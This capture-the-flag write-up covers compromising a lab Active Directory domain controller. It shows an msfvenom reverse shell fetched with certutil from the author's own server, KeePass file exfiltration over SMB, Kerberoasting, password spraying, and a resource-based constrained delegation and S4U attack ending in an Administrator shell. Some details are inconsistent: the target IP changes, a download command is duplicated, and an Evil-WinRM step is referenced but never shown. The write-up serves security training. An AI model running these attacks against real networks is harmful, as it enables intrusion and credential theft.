
# CTF Writeup: Forward

---
## Provided Credentials

```
ctf.local\j.smith
```

```
JSmith@IT2024
```

## Reconnaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -n -Pn -sS -p- 10.113.188.199
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-17 06:55 -0500
Nmap scan report for 10.113.188.199
Host is up (0.012s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49667/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49678/tcp open  unknown
49700/tcp open  unknown
49807/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 105.72 seconds
```

An more detailled scan revealed the detailled information about the running services.

```
nmap -n -Pn -sSCV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49667,49676,49677,49678,49700,49807 10.113.188.199
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-17 06:58 -0500
Nmap scan report for 10.113.188.199
Host is up (0.011s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-17 11:58:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-07-17T11:59:51+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=DC01.ctf.local
| Not valid before: 2026-05-19T02:27:27
|_Not valid after:  2026-11-18T02:27:27
| rdp-ntlm-info: 
|   Target_Name: CTF
|   NetBIOS_Domain_Name: CTF
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ctf.local
|   DNS_Computer_Name: DC01.ctf.local
|   DNS_Tree_Name: ctf.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-17T11:59:11+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49807/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-17T11:59:13
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: -3s, deviation: 0s, median: -3s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.13 seconds
```

Judging from the services running and the hostname of the target system, we assume that this is an Domain Controller. We also retrieved information about the internal domain "ctf.local", the Hostname DC01 & the computer name DC01.ctf.local. Let's map them to the target ip in our local dns file.

```
echo "10.113.188.199 DC01 DC01.ctf.local ctf.local" | tee -a /etc/hosts
```

Before I connect to the DC itself, I'd like to enumerate the surface level services. Let's start with smb.

```
smbmap -H ctf.local -u j.smith -p 'JSmith@IT2024'
```

smbmap gave us information about all shares. There seems to be an non-default SMB Share "Downloads". 

```
smbclient \\\\ctf.local/Downloads -U j.smith
```

The Share is empty.

I proceeded with connecting to RPC.

```
rpcclient -U "ctf.local\j.smith%JSmith@IT2024" ctf.local
```

Enumerated users on the target server.

```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[j.smith] rid:[0x649]
user:[t.jones] rid:[0x64a]
user:[r.williams] rid:[0x64b]
user:[svc.helpdesk] rid:[0x64c]
```

Tried to enumerate LDAP, with ldapsearch, but also didn't find anything interesting. Moved onto logging in via RDP to the DC.

```
xfreerdp3 /cert:ignore /clipboard /compression /auto-reconnect /u:j.smith /p:JSmith@IT2024 /v:10.113.188.199 /w:1600 /h:800 /drive:test,/home/saitama/Desktop
```

Identified that our current session "j.smith" is AppLocker Restricted and is part of an non-default group named "LOCAL".

Found an interesting KeePass Database File in C:\Users\j.smith\Documents.
Downloaded to my local machine.

Started up an smbserver on my local machine.

```
impacket-smbserver test . -smb2support -username saitama -password saitama
```

Executed the following command on the target system.

```
net use m: \\192.168.170.177\test /user:saitama saitama
```

Copied the Database.kdbx file onto my SMB Share, which automatically transfers it to my local machine.

```
copy Database.kdbx m:\
```

```
ls
bloodhound  Database.kdbx  ldapsearch.txt  smb
```

My initiative was to convert the keepass database to hash, but this seemed 
to be not possible. Since there is an version mismatch.

```
keepass2john Database.kdbx > hash
! Database.kdbx : File version '40000' is currently not supported!
```

I decided to not dig deeper into this anymore and first of all start with enumerating the targetsystem in our RDP Session.

Generated an shell.exe reverse shell using msfvenom.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 
-f exe -o shell.exe
```

Started python webserver on my local machine in which winPEAS is stored.

```
python3 -m http.server 80
```

Downloaded both winPEAS.exe and the reverse shell to the target system.

```
certutil -urlcache -split -f http://192.168.170.177/shell.exe shell.exe
```

```
certutil -urlcache -split -f http://192.168.170.177/shell.exe shell.exe
```

Started up netcat listener on my local machine.

```
rlwrap nc -lvnp 443
```

Executed shell.exe on my RDP Session and gained RCE on my local machine.

```
rlwrap nc -lvnp 443      
listening on [any] 443 ...
connect to [192.168.170.177] from (UNKNOWN) [10.113.188.199] 54998
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Temp>
```

Ran winPEAS.exe from there, because in the CMD Session in RDP running winPEAS.exe will look very unclear.

Wasn't able to find anything interesting using winPEAS, also manual enumeration didn't provide anything we could abuse, so I'm assuming we either escalate our privileges using Domain Policies or the KDBX File. 

Downloaded domain information.

```
bloodhound-python -u j.smith -p 'JSmith@IT2024' -ns 10.113.188.199 -d ctf.local -c all
```

Started up bloodhound.

```
neo4j console
bloodhound
```

I marked user "j.smith" as owned. Since we got an RDP Session as this user, but he doesn't seem to have any outbound object control. I found out through bloodhound that the HelpDesk Service Account seems to be kerberoastable!

```
impacket-GetUserSPNs -request -dc-ip 10.113.172.107 ctf.local/j.smith
```

Retrieved TGT of this service account. Stored it in an svc.helpdesk file on my local machine.

Started to bruteforce using hashcat, but the process is "exhausted". Which means we can't bruteforce an passphrase out of this TGT.

```
hashcat -m 13100 svc.helpdesk /usr/share/wordlists/rockyou.txt
```

I wasn't able to identify more in bloodhound and way more enumeration processes. So my conclusion that the KeePass Database File will be our priv esc method. But how will I be able to convert the keepass database file to hash format, so I could potentially bruteforce an passphrase.

I utilized keepass2john.py instead of the normal binary. Since this python script supports all file versions.

```
python3 /opt/arsenal/kdbx2john/keepass2john.py Database.kdbx > hash
```

But I wasn't able to bruteforce anything useful. Since in my enumeration phase I discovered that KeePass was installed on the target system I went into the RDP Session and opened the database from there without any password and we entered the database!

I discovered new credentials.

```
t.jones:Helpdesk01!
```

Spraying credentials with all users and the 2 discovered password revealed that the password is being used for "r.williams" aswell! And t.jones & r.williams can connect to the target system using RDP.

```
nxc rdp ctf.local -u users.txt -p passwords.txt --continue-on-success
```

Upon marking all the new users as owned in BloodHound I realised that User r.williams has outbound object control set on the domain controller itself "AddAllowedToAct".

Connected to user r.williams.

```
xfreerdp3 /cert:ignore /clipboard /compression /auto-reconnect /u:r.williams /p:Helpdesk01! /v:10.113.172.107 /w:1600 /h:800 /drive:test,/home/saitama/Desktop
```

He is part of the sysadmin group. The AddAllowedToAct Policy allows us to perform an RBCD Attack.

Let's check the value of the ms-ds-machineaccountquota attribute. Is it 10?

```
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
```

The output of the above command shows that this attribute is set to 10, which means each authenticated domain user can add up to 10 computers to the domain.

3. Next, let's verify that the msds-allowedtoactonbehalfofotheridentity attribute is empty. To do so, we need the PowerView module for PowerShell. We can upload it to the server via Evil-WinRM as shown previously. 

We can then import it with the following command

```
. ./PowerView.ps1
```

Once the module has been imported we can use the Get-DomainComputer commandlet to query the required information.

```
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
```

If the output is empty, we can perform the RBCD Attack.

We will need PowerMad and Rubeus, which we can upload using Evil-WinRM as shown previously. PowerMad can be imported with the following command.

```
. ./Powermad.ps1
```
## Creating a Computer Object

Now, let's create a fake computer and add it to the domain. We can use PowerMad's New-MachineAccount to achieve this.

```
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

Verify it worked:

```
Get-ADComputer -identity FAKE-COMP01
```
# Configuring RBCD

Next, we will need to configure Resource-Based Constrained Delegation through one of two ways. We can either set the PrincipalsAllowedToDelegateToAccount value to FAKE-COMP01 through the builtin PowerShell Active Directory module, which will in turn configure the msds-allowedtoactonbehalfofotheridentity attribute on its own.

Let's use the Set-ADComputer command to configure RBCD.

```
Set-ADComputer -Identity DC01 -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```

To verify that the command worked run the following command:

```
Get-ADComputer -Identity DC01 -Properties PrincipalsAllowedToDelegateToAccount
```

As we can see, the PrincipalsAllowedToDelegateToAccount is set to FAKE-COMP01 , which means the command worked. 

We can also verify the value of the msds-allowedtoactonbehalfofotheridentity

```
Get-DomainComputer DC01 | select msds-allowedtoactonbehalfofotheridentity
```

As we can see, the msds-allowedtoactonbehalfofotheridentity now has a value, but because the type of this attribute is Raw Security Descriptor we will have to convert the bytes to a string to understand what's going on.

First, let's grab the desired value and dump it to a variable called RawBytes .

```
$RawBytes = Get-DomainComputer DC01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
```

Then, let's convert these bytes to a Raw Security Descriptor object.

```
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
```

Finally, we can print both the entire security descriptor, as well as the DiscretionaryAcl class, which represents the Access Control List that specifies the machines that can act on behalf of the DC.

```
$Descriptor
$Descriptor.DiscretionaryAcl
```

From the output we can see that the SecurityIdentifier is set to the SID of FAKE-COMP01 that we saw earlier, and the AceType is set to AccessAllowed 
# Performing a S4U Attack

It is now time to perform the S4U attack, which will allow us to obtain a Kerberos ticket on behalf of the Administrator. 

We will be using Rubeus to perform this attack. First, we will need the hash of the password that was used to create the computer object.

Downloaded the .exe onto the target system.

```
certutil -urlcache -split -f http://192.168.170.177/Rubeus.exe Rubeus.exe
```

```
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:ctf.local
```

Utilize the "rc4_hmac" hashed password.

```
58A478135A93AC3BF058A5EA0E8FDB71
```

Next, we can generate Kerberos tickets for the Administrator.
(Note: Break out evil-winrm and get an shell)

```
./Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:administrator /msdsspn:cifs/dc01.ctf.local /ptt /nowrap
```

Rubeus successfuly generated the tickets. We can now grab the last Base64 encoded ticket and use it on our local machine to get a shell on the DC as Administrator . To do so, copy the value of the last ticket and paste it inside a file called ticket.kirbi.b64

Note: Before pasting the value to the file make sure to remove any whitespace characters from the value.

Next, create a new file called ticket.kirbi with the Base64 decoded value of the previous ticket.

```
base64 -d ticket.kirbi.b64 > ticket.kirbi
```

Finally, we can convert this ticket to a format that Impacket can use. This can be achieved with Impackets TicketConverter.py

```
impacket-ticketConverter ticket.kirbi ticket.ccache   
```

To acquire a shell we can use Impackets psexec.py 

```
KRB5CCNAME=ticket.ccache impacket-psexec ctf.local/administrator@dc01.ctf.local -k -no-pass
```

Retrieved flag.txt in C:\Users\Administrator\Desktop.

```
THM{RBCD_S4U2Pr0xy_T1ck3t_Th3ft_2_DA}
```